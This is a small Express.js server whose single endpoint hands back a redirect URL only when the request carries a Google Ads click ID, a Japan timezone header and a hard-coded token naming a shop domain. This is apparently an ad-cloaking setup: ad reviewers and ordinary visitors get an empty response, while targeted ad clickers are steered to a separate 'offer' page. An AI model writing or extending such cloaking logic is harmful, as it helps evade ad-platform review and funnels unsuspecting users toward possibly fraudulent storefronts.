const express = require("express");
const app = express();

const PORT = process.env.PORT || 3000;

// CONFIG
const REDIRECT_URL = "https://example.com/jp-offer"; // change this
const REQUIRED_TIMEZONE = "Asia/Tokyo";

app.get("/getData", (req, res) => {
  const gclid = req.query.gclid;
  const token = req.query.token;
  const timezone = req.headers["x-client-timezone"];

  // Optional shared secret check
  if (token !== "refliefcart.shop") {
    return res.status(403).json({ error: "Invalid token" });
  }

  // Conditions
  if (gclid && timezone === REQUIRED_TIMEZONE) {
    return res.json({
      redirect: true,
      url: REDIRECT_URL,
    });
  }

  // No redirect
  return res.status(204).end();
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
